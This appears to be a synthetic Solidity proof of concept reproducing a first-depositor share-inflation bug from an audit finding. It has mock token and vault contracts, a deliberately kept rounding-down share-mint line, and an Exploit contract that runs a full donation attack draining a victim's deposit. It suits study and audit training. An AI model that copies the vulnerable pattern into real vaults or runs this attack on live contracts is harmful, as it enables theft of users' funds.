// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Ammplify — H-6: Compounded maker first-deposit share inflation (Sherlock #63172)

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground.
    Root cause: shares = liq * totalShares / totalLiq rounds down; min liquidity
    is enforced, not min shares. Donation after tiny first deposit inflates
    share price so victim mints 0 shares and loses deposit.
    Vulnerable mintShares line preserved (@> VULN).
//////////////////////////////////////////////////////////////////////////*/

contract MockToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address sp, uint256 amt) external returns (bool) {
        allowance[msg.sender][sp] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        require(balanceOf[msg.sender] >= amt, "bal");
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        require(balanceOf[from] >= amt, "bal");
        uint256 a = allowance[from][msg.sender];
        require(a >= amt, "allow");
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amt;
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @dev One compounding segment vault (classic first-depositor inflation).
/// Mirrors Liq.sol share mint rounding + Maker min target liq only.
contract CompoundSegment {
    MockToken public immutable asset;
    uint256 public totalLiq; // underlying liquidity units held by vault
    uint256 public totalShares;
    mapping(address => uint256) public sharesOf;
    uint256 public constant MIN_LIQ = 1e6; // min target liquidity (NOT min shares)

    constructor(MockToken a) {
        asset = a;
    }

    /// @notice Deposit `liq` units; mint shares rounding down (vulnerable).
    function deposit(address to, uint256 liq) external returns (uint256 shares) {
        require(liq >= MIN_LIQ, "min liq"); // only min liquidity, not min shares
        // Pull tokens representing liquidity
        require(asset.transferFrom(msg.sender, address(this), liq), "pull");

        if (totalShares == 0) {
            shares = liq; // 1:1 first deposit
        } else {
            // Source: Ammplify src/walkers/Liq.sol share mint (compound path)
            // FIX: enforce min shares / virtual offsets (ERC4626-style)
            shares = (liq * totalShares) / totalLiq; // @> VULN: rounds down — after donation share price inflates so victim mints 0 shares
        }
        totalLiq += liq;
        totalShares += shares;
        sharesOf[to] += shares;
    }

    /// @dev Donation inflates totalLiq without minting shares (uniswap flash/donate).
    function donate(uint256 amt) external {
        require(asset.transferFrom(msg.sender, address(this), amt), "donate");
        totalLiq += amt;
    }

    /// @notice Shrink attacker position to exactly `keepShares` (adjustMaker leave-min-share).
    function shrinkToShares(address who, uint256 keepShares) external {
        require(totalShares > 0 && keepShares > 0, "empty");
        uint256 have = sharesOf[who];
        require(have >= keepShares, "shares");
        uint256 burn = have - keepShares;
        if (burn > 0) {
            uint256 liqOut = (burn * totalLiq) / totalShares;
            sharesOf[who] = keepShares;
            totalShares -= burn;
            totalLiq -= liqOut;
            asset.transfer(who, liqOut);
        }
    }

    function redeemAll(address who) external returns (uint256 liqOut) {
        uint256 s = sharesOf[who];
        if (s == 0) return 0;
        liqOut = (s * totalLiq) / totalShares;
        sharesOf[who] = 0;
        totalShares -= s;
        totalLiq -= liqOut;
        asset.transfer(who, liqOut);
    }
}

/// CREATE: token(1), vault(2)
contract Exploit {
    MockToken public token;
    CompoundSegment public vault;

    address public constant ATTACKER = address(0xA11CE);
    address public constant VICTIM = address(0xB0B);

    uint256 public victimShares;
    uint256 public attackerRedeem;
    uint256 public victimLoss;

    constructor() {
        token = new MockToken(); // 1
        vault = new CompoundSegment(token); // 2
    }

    function run() external {
        // Fund attacker path (this contract pulls tokens into vault)
        token.mint(address(this), 10_000e18);
        token.approve(address(vault), type(uint256).max);

        // --- attacker first deposit min liq ---
        vault.deposit(ATTACKER, 1e6); // min liquidity → 1e6 shares

        // donate to inflate share price ≈ (1e6+1e18)/1e6 ≈ 1e12 per share
        vault.donate(1e18);

        // leave exactly 1 share (share price still huge after prior donation)
        vault.shrinkToShares(ATTACKER, 1);
        require(vault.sharesOf(ATTACKER) == 1, "attacker left with 1 share");

        // second donation ≈ victim deposit → 1 share worth >> 300e18
        vault.donate(300e18 + 1);

        // --- victim deposits 300e18, expects shares, gets 0 (round down) ---
        uint256 vBefore = 300e18;
        vault.deposit(VICTIM, 300e18);
        victimShares = vault.sharesOf(VICTIM);
        require(victimShares == 0, "victim should get 0 shares");

        uint256 vOut = vault.redeemAll(VICTIM);
        require(vOut == 0, "victim gets nothing back");
        victimLoss = vBefore;

        // attacker redeems sole share → takes vault including victim deposit
        attackerRedeem = vault.redeemAll(ATTACKER);
        require(attackerRedeem > 300e18, "attacker stole victim deposit");
        require(victimLoss == 300e18, "victim lost full deposit");
    }
}
